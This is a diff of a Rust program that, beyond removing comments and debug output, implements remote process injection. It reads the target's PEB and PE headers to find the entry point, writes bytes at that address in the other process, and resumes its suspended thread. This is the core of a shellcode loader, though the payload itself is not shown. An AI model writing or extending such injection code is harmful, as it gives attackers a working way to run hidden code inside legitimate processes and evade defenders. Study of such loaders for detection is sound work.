@@ -1,4 +1,4 @@
-use std::{ffi::c_void};
+use std::ffi::c_void;
 use libloading::{Library, Symbol};
 use std::ptr::{null, null_mut};
 
@@ -42,16 +42,6 @@ struct ProcessBasicInformation {
     base_priority: *const c_void,
     unique_process_id: *const c_void,
     inherited_from_unique_process_id: *const c_void
-}
-
-struct ImageFileHeader {
-    machine: u16,
-    number_of_sections: u16,
-    time_date_stamp: u32,
-    pointer_to_symbol_table: u32,
-    number_of_symbols: u32,
-    size_of_optional_header: u16,
-    characteristics: u16,
 }
 
 struct WindowsAPI {
@@ -233,7 +223,6 @@ fn main() {
     let module_base_address_offset = 0x10;
     let module_base_address_ptr = peb_base_address as u64 + module_base_address_offset as u64;
 
-    // Read base address from memory
     let mut base_address = [0u8; std::mem::size_of::<u64>()];
     unsafe { 
         win_api.read_process_memory(
@@ -245,8 +234,6 @@ fn main() {
         )
     };
 
-
-    // Interpret the read bytes as a 64-bit integer
     let base_address_value = u64::from_le_bytes(base_address);
     println!("Got base address of process with value: 0x{:X}", base_address_value);
 
@@ -269,13 +256,6 @@ fn main() {
     }
 
 
-    // print first 20 bytes of data
-    for i in 0..20 {
-        print!("{:x} ", data[i]);
-    }
-    println!();
-
-
     let e_lfanew_offset = base_address_value + 0x3c; 
 
     let mut e_lfanew = [0u8; std::mem::size_of::<u32>()];
@@ -288,21 +268,14 @@ fn main() {
             null_mut()
     )};
 
-    // Correctly interpret the bytes as u32
     let e_lfanew = u32::from_le_bytes(e_lfanew);
     println!("Got e_lfanew with value: 0x{:x}", e_lfanew);
 
-    // Assuming e_lfanew is already obtained
     let image_file_header_size = 20; // Size of IMAGE_FILE_HEADER
     let optional_header_entrypoint_offset = 0x18; // Offset to AddressOfEntryPoint
-
-    // Calculate the address to read entrypoint_rva
     let entrypoint_rva_address = base_address_value + e_lfanew as u64 + image_file_header_size as u64 + optional_header_entrypoint_offset;
-
-    // Buffer to store the entrypoint_rva value (4 bytes for DWORD)
     let mut entrypoint_rva = [0u8; 4];
 
-    // Read the entrypoint_rva value
     let result = unsafe { 
         win_api.read_process_memory(
             handle,
@@ -318,14 +291,10 @@ fn main() {
         return;
     }
 
-    // Correctly interpret the bytes as u32
     let entrypoint_rva = u32::from_le_bytes(entrypoint_rva);
-
-    // Now you have the correct entrypoint_rva value
     println!("Got entrypoint_rva with value: 0x{:X}", entrypoint_rva);
     
     let entrypoint_address = base_address_value + entrypoint_rva as u64;
-
     println!("Got entrypoint_address with value: 0x{:X}", entrypoint_address);
    
     let mut bytes_written = 0;
@@ -337,14 +306,5 @@ fn main() {
         println!("Wrote {} bytes to process", bytes_written);
     }
     
-
-    // Resume thread
-    let result = unsafe { win_api.resume_thread((*process_info_ptr).h_process) };
-    if result == 0 {
-        println!("ResumeThread failed with error code: {}", unsafe { win_api.get_last_error() });
-        return;
-    } else {
-        unsafe { win_api.resume_thread((*process_info_ptr).h_thread) };
-        println!("ResumeThread succeeded");
-    }
+    unsafe { win_api.resume_thread((*process_info_ptr).h_thread) };
 }
